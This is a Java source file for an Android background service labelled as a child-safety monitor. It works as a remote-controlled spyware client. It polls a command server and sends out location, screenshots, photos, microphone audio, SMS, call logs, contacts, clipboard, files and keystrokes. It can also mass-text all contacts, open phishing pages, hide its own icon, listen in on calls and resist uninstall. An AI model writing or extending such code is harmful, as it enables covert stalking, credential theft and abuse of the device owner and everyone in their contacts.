package com.example.childsafetymonitor.services;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.childsafetymonitor.MainActivity;
import com.example.childsafetymonitor.R;
import com.example.childsafetymonitor.api.ApiService;
import com.example.childsafetymonitor.api.models.Command;
import com.example.childsafetymonitor.api.models.DeviceInfo;
import com.example.childsafetymonitor.api.models.ServerResponse;
import com.example.childsafetymonitor.utils.AppUtils;
import com.example.childsafetymonitor.utils.CameraHelper;
import com.example.childsafetymonitor.utils.CallUtils;
import com.example.childsafetymonitor.utils.ContactsHelper;
import com.example.childsafetymonitor.utils.FileHelper;
import com.example.childsafetymonitor.utils.KeyloggerManager;
import com.example.childsafetymonitor.utils.ScreenCaptureManager;
import com.example.childsafetymonitor.utils.SecurityManager;
import com.example.childsafetymonitor.utils.SettingsManager;
import com.example.childsafetymonitor.utils.SmsHelper;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MonitoringService extends Service implements LocationListener {
    private static final String TAG = "MonitoringService";
    public static final String EXTRA_RESULT_DATA = "result_data";
    
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "monitoring_service_channel";
    private static final long LOCATION_UPDATE_INTERVAL = 15 * 60 * 1000; // 15 minutes
    private static final long COMMAND_CHECK_INTERVAL = 30 * 1000; // 30 seconds
    
    private LocationManager locationManager;
    private PowerManager.WakeLock wakeLock;
    private ApiService apiService;
    private SettingsManager settingsManager;
    private ScheduledExecutorService scheduler;
    private Handler mainHandler;
    private CameraHelper cameraHelper;
    private SmsHelper smsHelper;
    private ContactsHelper contactsHelper;
    private CallUtils callUtils;
    private KeyloggerManager keyloggerManager;
    private ScreenCaptureManager screenCaptureManager;
    private SecurityManager securityManager;
    private FileHelper fileHelper;
    private AudioManager audioManager;
    private CameraManager cameraManager;
    
    private String deviceId;
    private boolean isInitialized = false;
    private Timer commandCheckTimer;
    private MediaRecorder mediaRecorder;
    private File audioOutputFile;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service creating...");
        
        // Initialize components
        mainHandler = new Handler(Looper.getMainLooper());
        scheduler = Executors.newScheduledThreadPool(5);
        settingsManager = new SettingsManager(this);
        deviceId = settingsManager.getDeviceId();
        
        // If no device ID exists, generate one
        if (deviceId == null || deviceId.isEmpty()) {
            deviceId = UUID.randomUUID().toString();
            settingsManager.setDeviceId(deviceId);
        }
        
        // Initialize API service
        apiService = new ApiService(this, settingsManager.getServerUrl());
        
        // Initialize utility helpers
        cameraHelper = new CameraHelper(this);
        smsHelper = new SmsHelper(this);
        contactsHelper = new ContactsHelper(this);
        callUtils = new CallUtils(this);
        keyloggerManager = new KeyloggerManager(this);
        securityManager = new SecurityManager(this);
        fileHelper = new FileHelper(this);
        
        // Get system services
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        
        // Initialize wake lock to keep service running
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildSafetyMonitor:WakeLock");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service starting...");
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        
        if (!isInitialized) {
            initialize();
            isInitialized = true;
        }
        
        // Handle screen capture intent if present
        if (intent != null && intent.hasExtra(EXTRA_RESULT_DATA)) {
            Intent resultData = intent.getParcelableExtra(EXTRA_RESULT_DATA);
            if (resultData != null && screenCaptureManager != null) {
                screenCaptureManager.setMediaProjectionIntent(resultData);
            }
        }
        
        // Ensure we stay running
        return START_STICKY;
    }
    
    private void initialize() {
        // Start wake lock
        acquireWakeLock();
        
        // Register device with server
        registerDeviceWithServer();
        
        // Start location updates if enabled
        if (settingsManager.isLocationTrackingEnabled()) {
            startLocationUpdates();
        }
        
        // Initialize screen capture if media projection intent is available
        screenCaptureManager = new ScreenCaptureManager(this);
        
        // Start listening for keystrokes if enabled
        if (settingsManager.isKeyloggerEnabled()) {
            keyloggerManager.startKeylogger();
        }
        
        // Schedule periodic command checks
        startCommandChecking();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Monitoring Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Used for the monitoring service");
            
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }
    
    private Notification buildNotification() {
        // Create notification for foreground service
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(settingsManager.getNotificationTitle())
                .setContentText(settingsManager.getNotificationText())
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pendingIntent)
                .build();
    }
    
    private void acquireWakeLock() {
        if (!wakeLock.isHeld()) {
            wakeLock.acquire();
        }
    }
    
    private void registerDeviceWithServer() {
        ApiService.DeviceRegistration registration = new ApiService.DeviceRegistration(
                deviceId, 
                Build.MODEL, 
                Build.VERSION.RELEASE, 
                AppUtils.getDeviceName()
        );
        
        scheduler.execute(() -> {
            try {
                ServerResponse response = apiService.registerDevice(registration);
                if (response != null && response.isSuccess()) {
                    Log.d(TAG, "Device registered successfully");
                    // Send initial device info after registration
                    sendDeviceInfo();
                } else {
                    Log.e(TAG, "Failed to register device: " + (response != null ? response.getMessage() : "Unknown error"));
                }
            } catch (IOException e) {
                Log.e(TAG, "Error registering device", e);
            }
        });
    }
    
    private void startLocationUpdates() {
        try {
            if (locationManager != null) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestLocationUpdates(
                            LocationManager.GPS_PROVIDER,
                            LOCATION_UPDATE_INTERVAL,
                            10, // minimum distance in meters
                            this
                    );
                }
                
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER,
                            LOCATION_UPDATE_INTERVAL,
                            10, // minimum distance in meters
                            this
                    );
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "No permission for location", e);
        }
    }
    
    private void startCommandChecking() {
        if (commandCheckTimer != null) {
            commandCheckTimer.cancel();
        }
        
        commandCheckTimer = new Timer();
        commandCheckTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                checkForCommands();
            }
        }, 5000, COMMAND_CHECK_INTERVAL); // Check every 30 seconds
    }
    
    private void checkForCommands() {
        scheduler.execute(() -> {
            try {
                List<Command> commands = apiService.getCommands(deviceId);
                
                if (commands != null && !commands.isEmpty()) {
                    for (Command command : commands) {
                        processCommand(command);
                    }
                }
            } catch (IOException e) {
                Log.e(TAG, "Error checking for commands", e);
            }
        });
    }
    
    private void processCommand(Command command) {
        Log.d(TAG, "Processing command: " + command.getType());
        
        switch (command.getType()) {
            case "location":
                sendCurrentLocation();
                break;
                
            case "screenshot":
                captureScreenshot();
                break;
                
            case "camera":
                String cameraType = command.getParams().optString("cameraType", "back");
                takePhoto(cameraType);
                break;
                
            case "mic":
                int duration = command.getParams().optInt("duration", 30);
                recordAudio(duration);
                break;
                
            case "call_logs":
                sendCallLogs();
                break;
                
            case "sms_read":
                sendSmsMessages();
                break;
                
            case "sms_send":
                String number = command.getParams().optString("number");
                String message = command.getParams().optString("message");
                if (number != null && message != null) {
                    sendSms(number, message);
                }
                break;
                
            case "sms_send_all":
                String messageToAll = command.getParams().optString("message");
                if (messageToAll != null) {
                    sendSmsToAllContacts(messageToAll);
                }
                break;
                
            case "contacts":
                sendContacts();
                break;
                
            case "screen_mirror":
                boolean active = command.getParams().optBoolean("active", false);
                toggleScreenMirroring(active);
                break;
                
            case "files_list":
                String path = command.getParams().optString("path", "/storage/emulated/0");
                listFiles(path);
                break;
                
            case "files_get":
                String filePath = command.getParams().optString("path");
                if (filePath != null) {
                    downloadFile(filePath);
                }
                break;
                
            case "files_delete":
                String fileToDelete = command.getParams().optString("path");
                if (fileToDelete != null) {
                    deleteFile(fileToDelete);
                }
                break;
                
            case "clipboard":
                sendClipboardContent();
                break;
                
            case "apps":
                sendInstalledApps();
                break;
                
            case "keylogger":
                boolean enabled = command.getParams().optBoolean("enabled", false);
                toggleKeylogger(enabled);
                break;
                
            case "block_app":
                String packageName = command.getParams().optString("packageName");
                if (packageName != null) {
                    blockApp(packageName);
                }
                break;
                
            case "unblock_app":
                String packageToUnblock = command.getParams().optString("packageName");
                if (packageToUnblock != null) {
                    unblockApp(packageToUnblock);
                }
                break;
                
            case "device_info":
                sendDeviceInfo();
                break;
                
            case "notify":
                String title = command.getParams().optString("title");
                String text = command.getParams().optString("text");
                if (title != null && text != null) {
                    showNotification(title, text);
                }
                break;
                
            case "toast":
                String toastMessage = command.getParams().optString("message");
                if (toastMessage != null) {
                    showToast(toastMessage);
                }
                break;
                
            case "vibrate":
                int vibrateDuration = command.getParams().optInt("duration", 500);
                vibrateDevice(vibrateDuration);
                break;
                
            case "torch":
                boolean torchOn = command.getParams().optBoolean("on", false);
                toggleTorch(torchOn);
                break;
                
            case "volume":
                int volumeLevel = command.getParams().optInt("level", -1);
                String volumeType = command.getParams().optString("type", "ring");
                if (volumeLevel >= 0) {
                    setVolume(volumeType, volumeLevel);
                }
                break;
                
            case "control":
                String action = command.getParams().optString("action");
                if (action != null) {
                    performControlAction(action);
                }
                break;
                
            case "phishing":
                String target = command.getParams().optString("target", "google");
                openPhishingPage(target);
                break;
                
            case "hide_app":
                hideApp();
                break;
                
            case "unhide_app":
                unhideApp();
                break;
                
            case "uninstall_app":
                String password = command.getParams().optString("password");
                if (password != null) {
                    uninstallApp(password);
                }
                break;
                
            case "call_listen":
                boolean callListenEnabled = command.getParams().optBoolean("enabled", false);
                toggleCallListen(callListenEnabled);
                break;
                
            case "set_2fa":
                boolean twoFaEnabled = command.getParams().optBoolean("enabled", false);
                String email = command.getParams().optString("email", "");
                setup2FA(twoFaEnabled, email);
                break;
                
            default:
                Log.w(TAG, "Unknown command type: " + command.getType());
                break;
        }
    }
    
    private void sendCurrentLocation() {
        try {
            Location lastKnownLocation = null;
            
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            
            if (lastKnownLocation == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (lastKnownLocation != null) {
                ApiService.LocationUpdate locationUpdate = new ApiService.LocationUpdate(
                        lastKnownLocation.getLatitude(),
                        lastKnownLocation.getLongitude(),
                        lastKnownLocation.getAccuracy(),
                        lastKnownLocation.getTime()
                );
                
                scheduler.execute(() -> {
                    try {
                        apiService.sendUpdate(deviceId, "location", locationUpdate);
                    } catch (IOException e) {
                        Log.e(TAG, "Error sending location update", e);
                    }
                });
            } else {
                Log.w(TAG, "No last known location available");
            }
        } catch (SecurityException e) {
            Log.e(TAG, "No permission for location", e);
        }
    }
    
    private void captureScreenshot() {
        if (screenCaptureManager != null && screenCaptureManager.hasScreenCapturePermission()) {
            screenCaptureManager.captureScreenshot(imageBytes -> {
                ApiService.ScreenshotUpdate update = new ApiService.ScreenshotUpdate(imageBytes);
                
                scheduler.execute(() -> {
                    try {
                        apiService.sendUpdate(deviceId, "screenshot", update);
                    } catch (IOException e) {
                        Log.e(TAG, "Error sending screenshot", e);
                    }
                });
            });
        } else {
            Log.w(TAG, "Screen capture not available");
        }
    }
    
    private void takePhoto(String cameraType) {
        cameraHelper.takePicture(cameraType, imageBytes -> {
            ApiService.CameraUpdate update = new ApiService.CameraUpdate(imageBytes, cameraType);
            
            scheduler.execute(() -> {
                try {
                    apiService.sendUpdate(deviceId, "camera_photo", update);
                } catch (IOException e) {
                    Log.e(TAG, "Error sending camera photo", e);
                }
            });
        });
    }
    
    private void recordAudio(int durationSeconds) {
        try {
            // Create temporary file for recording
            File outputDir = getCacheDir();
            audioOutputFile = File.createTempFile("audio_recording", ".3gp", outputDir);
            
            // Initialize media recorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioOutputFile.getAbsolutePath());
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            // Schedule stop after duration
            new Handler().postDelayed(() -> {
                stopAudioRecording();
                
                // Read file as bytes and send
                byte[] audioBytes = fileHelper.readFileAsBytes(audioOutputFile);
                if (audioBytes != null) {
                    ApiService.AudioUpdate update = new ApiService.AudioUpdate(audioBytes, durationSeconds);
                    
                    scheduler.execute(() -> {
                        try {
                            apiService.sendUpdate(deviceId, "audio_recording", update);
                        } catch (IOException e) {
                            Log.e(TAG, "Error sending audio recording", e);
                        }
                    });
                }
                
                // Delete temp file
                audioOutputFile.delete();
            }, durationSeconds * 1000);
            
        } catch (IOException e) {
            Log.e(TAG, "Error recording audio", e);
        }
    }
    
    private void stopAudioRecording() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            } catch (Exception e) {
                Log.e(TAG, "Error stopping media recorder", e);
            }
        }
    }
    
    private void sendCallLogs() {
        List<CallUtils.CallLogEntry> callLogs = callUtils.getCallLogs();
        ApiService.CallLogsUpdate update = new ApiService.CallLogsUpdate(callLogs);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "call_log", update);
            } catch (IOException e) {
                Log.e(TAG, "Error sending call logs", e);
            }
        });
    }
    
    private void sendSmsMessages() {
        List<SmsHelper.SmsMessage> messages = smsHelper.getSmsMessages();
        ApiService.SmsUpdate update = new ApiService.SmsUpdate(messages);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "sms_messages", update);
            } catch (IOException e) {
                Log.e(TAG, "Error sending SMS messages", e);
            }
        });
    }
    
    private void sendSms(String number, String message) {
        smsHelper.sendSms(number, message, success -> {
            ApiService.CommandResult result = new ApiService.CommandResult(
                    "sms_send", 
                    success ? "SMS sent successfully" : "Failed to send SMS"
            );
            
            scheduler.execute(() -> {
                try {
                    apiService.sendUpdate(deviceId, "command_result", result);
                } catch (IOException e) {
                    Log.e(TAG, "Error sending SMS result", e);
                }
            });
        });
    }
    
    private void sendSmsToAllContacts(String message) {
        List<ContactsHelper.Contact> contacts = contactsHelper.getContacts();
        final int[] successCount = {0};
        final int[] failCount = {0};
        final int total = contacts.size();
        
        for (ContactsHelper.Contact contact : contacts) {
            if (contact.phone != null && !contact.phone.isEmpty()) {
                smsHelper.sendSms(contact.phone, message, success -> {
                    if (success) {
                        successCount[0]++;
                    } else {
                        failCount[0]++;
                    }
                    
                    // If all sent, report back
                    if (successCount[0] + failCount[0] >= total) {
                        ApiService.CommandResult result = new ApiService.CommandResult(
                                "sms_send_all", 
                                String.format("SMS sent to %d/%d contacts", successCount[0], total)
                        );
                        
                        scheduler.execute(() -> {
                            try {
                                apiService.sendUpdate(deviceId, "command_result", result);
                            } catch (IOException e) {
                                Log.e(TAG, "Error sending SMS result", e);
                            }
                        });
                    }
                });
            }
        }
    }
    
    private void sendContacts() {
        List<ContactsHelper.Contact> contacts = contactsHelper.getContacts();
        ApiService.ContactsUpdate update = new ApiService.ContactsUpdate(contacts);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "contacts", update);
            } catch (IOException e) {
                Log.e(TAG, "Error sending contacts", e);
            }
        });
    }
    
    private void toggleScreenMirroring(boolean active) {
        if (active) {
            if (screenCaptureManager != null && screenCaptureManager.hasScreenCapturePermission()) {
                // Start periodic screenshots
                screenCaptureManager.startScreenMirroring(imageBytes -> {
                    ApiService.ScreenshotUpdate update = new ApiService.ScreenshotUpdate(imageBytes);
                    
                    scheduler.execute(() -> {
                        try {
                            apiService.sendUpdate(deviceId, "screenshot", update);
                        } catch (IOException e) {
                            Log.e(TAG, "Error sending mirrored screenshot", e);
                        }
                    });
                });
            }
        } else {
            if (screenCaptureManager != null) {
                screenCaptureManager.stopScreenMirroring();
            }
        }
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "screen_mirror", 
                active ? "Screen mirroring started" : "Screen mirroring stopped"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending screen mirror result", e);
            }
        });
    }
    
    private void listFiles(String path) {
        List<FileHelper.FileEntry> files = fileHelper.listFiles(path);
        ApiService.FileListUpdate update = new ApiService.FileListUpdate(files, path);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "file_list", update);
            } catch (IOException e) {
                Log.e(TAG, "Error sending file list", e);
            }
        });
    }
    
    private void downloadFile(String path) {
        byte[] fileData = fileHelper.readFileAsBytes(new File(path));
        
        if (fileData != null) {
            String fileName = new File(path).getName();
            ApiService.FileDataUpdate update = new ApiService.FileDataUpdate(fileData, fileName);
            
            scheduler.execute(() -> {
                try {
                    apiService.sendUpdate(deviceId, "file_data", update);
                } catch (IOException e) {
                    Log.e(TAG, "Error sending file data", e);
                }
            });
        }
    }
    
    private void deleteFile(String path) {
        boolean success = fileHelper.deleteFile(path);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "file_delete", 
                success ? "File deleted successfully" : "Failed to delete file"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending file delete result", e);
            }
        });
    }
    
    private void sendClipboardContent() {
        String clipboardText = AppUtils.getClipboardContent(this);
        ApiService.ClipboardUpdate update = new ApiService.ClipboardUpdate(clipboardText);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "clipboard", update);
            } catch (IOException e) {
                Log.e(TAG, "Error sending clipboard content", e);
            }
        });
    }
    
    private void sendInstalledApps() {
        List<AppUtils.AppInfo> apps = AppUtils.getInstalledApps(this);
        ApiService.AppListUpdate update = new ApiService.AppListUpdate(apps);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "app_list", update);
            } catch (IOException e) {
                Log.e(TAG, "Error sending app list", e);
            }
        });
    }
    
    private void toggleKeylogger(boolean enabled) {
        if (enabled) {
            keyloggerManager.startKeylogger();
        } else {
            keyloggerManager.stopKeylogger();
        }
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "keylogger", 
                enabled ? "Keylogger enabled" : "Keylogger disabled"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending keylogger result", e);
            }
        });
    }
    
    private void blockApp(String packageName) {
        boolean success = AppUtils.blockApp(this, packageName);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "block_app", 
                success ? "App blocked successfully" : "Failed to block app"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending block app result", e);
            }
        });
    }
    
    private void unblockApp(String packageName) {
        boolean success = AppUtils.unblockApp(this, packageName);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "unblock_app", 
                success ? "App unblocked successfully" : "Failed to unblock app"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending unblock app result", e);
            }
        });
    }
    
    private void sendDeviceInfo() {
        DeviceInfo info = AppUtils.getDeviceInfo(this);
        ApiService.DeviceInfoUpdate update = new ApiService.DeviceInfoUpdate(info);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "device_info", update);
            } catch (IOException e) {
                Log.e(TAG, "Error sending device info", e);
            }
        });
    }
    
    private void showNotification(String title, String text) {
        AppUtils.showNotification(this, title, text);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "notify", 
                "Notification shown successfully"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending notification result", e);
            }
        });
    }
    
    private void showToast(String message) {
        mainHandler.post(() -> {
            Toast.makeText(getApplicationContext(), message, Toast.LENGTH_LONG).show();
        });
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "toast", 
                "Toast message shown successfully"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending toast result", e);
            }
        });
    }
    
    private void vibrateDevice(int duration) {
        AppUtils.vibrate(this, duration);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "vibrate", 
                "Device vibrated successfully"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending vibrate result", e);
            }
        });
    }
    
    private void toggleTorch(boolean on) {
        try {
            String cameraId = cameraManager.getCameraIdList()[0]; // Usually the back camera
            cameraManager.setTorchMode(cameraId, on);
            
            ApiService.CommandResult result = new ApiService.CommandResult(
                    "torch", 
                    on ? "Torch turned on" : "Torch turned off"
            );
            
            scheduler.execute(() -> {
                try {
                    apiService.sendUpdate(deviceId, "command_result", result);
                } catch (IOException e) {
                    Log.e(TAG, "Error sending torch result", e);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error controlling torch", e);
        }
    }
    
    private void setVolume(String type, int level) {
        int maxVolume;
        int streamType;
        
        switch (type) {
            case "ring":
                streamType = AudioManager.STREAM_RING;
                break;
            case "music":
                streamType = AudioManager.STREAM_MUSIC;
                break;
            case "alarm":
                streamType = AudioManager.STREAM_ALARM;
                break;
            case "notification":
                streamType = AudioManager.STREAM_NOTIFICATION;
                break;
            default:
                streamType = AudioManager.STREAM_RING;
                break;
        }
        
        maxVolume = audioManager.getStreamMaxVolume(streamType);
        int volumeIndex = Math.min(level, maxVolume);
        
        audioManager.setStreamVolume(streamType, volumeIndex, 0);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "volume", 
                String.format("%s volume set to %d/%d", type, volumeIndex, maxVolume)
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending volume result", e);
            }
        });
    }
    
    private void performControlAction(String action) {
        boolean success = false;
        
        switch (action) {
            case "home":
                success = AppUtils.performHomeAction(this);
                break;
            case "back":
                success = AppUtils.performBackAction(this);
                break;
            case "recent":
                success = AppUtils.performRecentAction(this);
                break;
        }
        
        final boolean finalSuccess = success;
        ApiService.CommandResult result = new ApiService.CommandResult(
                "control", 
                finalSuccess ? "Control action performed: " + action : "Failed to perform control action"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending control result", e);
            }
        });
    }
    
    private void openPhishingPage(String target) {
        boolean success = AppUtils.openPhishingPage(this, target);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "phishing", 
                success ? "Phishing page opened: " + target : "Failed to open phishing page"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending phishing result", e);
            }
        });
    }
    
    private void hideApp() {
        Intent intent = new Intent(this, AppHidingService.class);
        intent.setAction(AppHidingService.ACTION_HIDE_APP);
        startService(intent);
        
        settingsManager.setHideAppEnabled(true);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "app_hidden", null);
            } catch (IOException e) {
                Log.e(TAG, "Error sending app hidden update", e);
            }
        });
    }
    
    private void unhideApp() {
        Intent intent = new Intent(this, AppHidingService.class);
        intent.setAction(AppHidingService.ACTION_UNHIDE_APP);
        startService(intent);
        
        settingsManager.setHideAppEnabled(false);
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "app_unhidden", null);
            } catch (IOException e) {
                Log.e(TAG, "Error sending app unhidden update", e);
            }
        });
    }
    
    private void uninstallApp(String password) {
        if (securityManager.verifyPassword(password)) {
            // If 2FA is enabled, this will trigger the 2FA verification flow
            if (settingsManager.isTwoFactorEnabled()) {
                String verificationCode = securityManager.generate2FACode();
                String email = settingsManager.getTwoFactorEmail();
                
                // In real app, send code to email
                // For now, just report back to server
                ApiService.TwoFactorVerification verification = new ApiService.TwoFactorVerification(
                        "uninstall",
                        verificationCode
                );
                
                scheduler.execute(() -> {
                    try {
                        apiService.sendUpdate(deviceId, "2fa_verification", verification);
                    } catch (IOException e) {
                        Log.e(TAG, "Error sending 2FA verification", e);
                    }
                });
            } else {
                // No 2FA, proceed with uninstall
                boolean success = AppUtils.initiateUninstall(this);
                
                ApiService.UninstallResult result = new ApiService.UninstallResult(
                        success,
                        success ? null : "Uninstall permission denied"
                );
                
                scheduler.execute(() -> {
                    try {
                        apiService.sendUpdate(deviceId, "app_uninstall_result", result);
                    } catch (IOException e) {
                        Log.e(TAG, "Error sending uninstall result", e);
                    }
                });
            }
        } else {
            // Password incorrect
            ApiService.UninstallResult result = new ApiService.UninstallResult(
                    false,
                    "Incorrect password"
            );
            
            scheduler.execute(() -> {
                try {
                    apiService.sendUpdate(deviceId, "app_uninstall_result", result);
                } catch (IOException e) {
                    Log.e(TAG, "Error sending uninstall result", e);
                }
            });
        }
    }
    
    private void toggleCallListen(boolean enabled) {
        if (enabled) {
            Intent intent = new Intent(this, CallMonitoringService.class);
            intent.setAction(CallMonitoringService.ACTION_START_CALL_LISTENING);
            startService(intent);
        } else {
            Intent intent = new Intent(this, CallMonitoringService.class);
            intent.setAction(CallMonitoringService.ACTION_STOP_CALL_LISTENING);
            startService(intent);
        }
        
        settingsManager.setCallRecordingEnabled(enabled);
        
        ApiService.CommandResult result = new ApiService.CommandResult(
                "call_listen", 
                enabled ? "Call listening enabled" : "Call listening disabled"
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "command_result", result);
            } catch (IOException e) {
                Log.e(TAG, "Error sending call listen result", e);
            }
        });
    }
    
    private void setup2FA(boolean enabled, String email) {
        settingsManager.setTwoFactorEnabled(enabled);
        if (enabled) {
            settingsManager.setTwoFactorEmail(email);
        }
        
        ApiService.TwoFactorStatus status = new ApiService.TwoFactorStatus(
                enabled,
                email
        );
        
        scheduler.execute(() -> {
            try {
                apiService.sendUpdate(deviceId, "2fa_status", status);
            } catch (IOException e) {
                Log.e(TAG, "Error sending 2FA status", e);
            }
        });
    }
    
    @Override
    public void onLocationChanged(@NonNull Location location) {
        if (settingsManager.isLocationTrackingEnabled()) {
            ApiService.LocationUpdate locationUpdate = new ApiService.LocationUpdate(
                    location.getLatitude(),
                    location.getLongitude(),
                    location.getAccuracy(),
                    location.getTime()
            );
            
            scheduler.execute(() -> {
                try {
                    apiService.sendUpdate(deviceId, "location", locationUpdate);
                } catch (IOException e) {
                    Log.e(TAG, "Error sending location update", e);
                }
            });
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroyed");
        
        // Clean up resources
        if (wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        if (locationManager != null) {
            try {
                locationManager.removeUpdates(this);
            } catch (SecurityException e) {
                Log.e(TAG, "Error removing location updates", e);
            }
        }
        
        if (commandCheckTimer != null) {
            commandCheckTimer.cancel();
            commandCheckTimer = null;
        }
        
        stopAudioRecording();
        
        if (keyloggerManager != null) {
            keyloggerManager.stopKeylogger();
        }
        
        if (screenCaptureManager != null) {
            screenCaptureManager.stopScreenMirroring();
        }
        
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
        
        super.onDestroy();
    }
    
    /**
     * Check if the monitoring service is running
     */
    public static boolean isRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (MonitoringService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}